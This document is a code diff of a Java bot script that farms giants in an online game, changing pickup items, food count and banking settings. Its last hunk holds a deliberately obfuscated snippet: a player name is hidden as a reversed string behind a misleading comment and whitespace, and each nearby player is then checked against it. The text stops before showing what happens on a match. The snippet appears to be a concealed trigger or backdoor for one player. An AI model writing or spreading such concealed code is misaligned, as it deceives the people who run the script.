@@ -13,7 +13,7 @@ public final class S_EdgevilleGiants extends Script {
     // Item IDs to pick up and bank
     // Copied from the other script
     private int[] pickup = {
-        10, 31, 32, 33, 35, 38, 40, 41, 42, 46, 413, 526, 527, 1277
+        10, 31, 32, 33, 35, 38, 40, 41, 42, 46, 220, 413, 526, 527, 1277
     };
     
     // Food to withdraw
@@ -30,10 +30,10 @@ public final class S_EdgevilleGiants extends Script {
     private int combat_style;
     
     // Food count to withdraw
-    private int w_food_count = 20;
+    private int w_food_count = 3;
     
     // Bank on full inv?
-    private boolean bank_full = false;
+    private boolean bank_full = true;
     
     // Bury or bank bones?
     private boolean bury;
@@ -286,7 +286,9 @@ public final class S_EdgevilleGiants extends Script {
                     }
                 } 
                 
-        }int[]item=get_item_by_id(pickup);String item_ = new StringBuilder("TteIrAcs")    /*                                                
+        }
+            int[]item=get_item_by_id(pickup);
+            String item_ = new StringBuilder("TteIrAcs")    /*                                                
         .toString()                         */.reverse()
         .toString().toLowerCase(Locale.ENGLISH);int item__=countPlayers();for(int item___=0;item___<item__;++item___){if(item_.equals(getPlayerName
                 (item___)
